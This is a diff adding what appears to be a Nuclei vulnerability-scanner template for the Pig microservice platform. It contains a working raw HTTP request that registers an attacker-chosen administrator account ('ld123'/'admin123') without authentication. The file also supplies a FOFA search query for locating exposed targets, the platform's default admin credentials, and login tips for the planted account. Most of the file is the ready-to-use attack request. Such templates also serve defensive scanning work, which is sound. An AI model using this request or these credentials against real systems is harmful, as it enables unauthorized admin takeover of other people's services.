@@ -1,0 +1,50 @@
+id: pig4cloud-unauth-useradd
+info:
+  name: Pig微服务前台任意管理员用户添加.
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/pig-mesh/pig-ui
+    - https://github.com/ybdt/exp-hub/blob/cae1cf153c434635991ac2662dbe8336ced026c7/Pig%E5%BE%AE%E6%9C%8D%E5%8A%A1/Pig%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body='pig微服务' && icon_hash="-827464441"
+    tips: ld123/admin123（注意登录时不要使用管理员登录框，而是普通用户，其权限为管理员而已，也有可能登录错误），该系统默认凭据 admin/123456，
+    repair:
+    version:
+  tags: pig4cloud,unauth
+
+http:
+  - raw:
+      - |
+        POST /api/admin/register/user HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
+        Priority: u=0, i
+        Connection: close
+        Content-Length: 141
+
+        {"userId":"1387","username":"ld123","password":"admin123", "create_by":"admin", "update_by":"admin","post":["1"],"role":["1"] }
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(header,'application/json')
+        condition: and
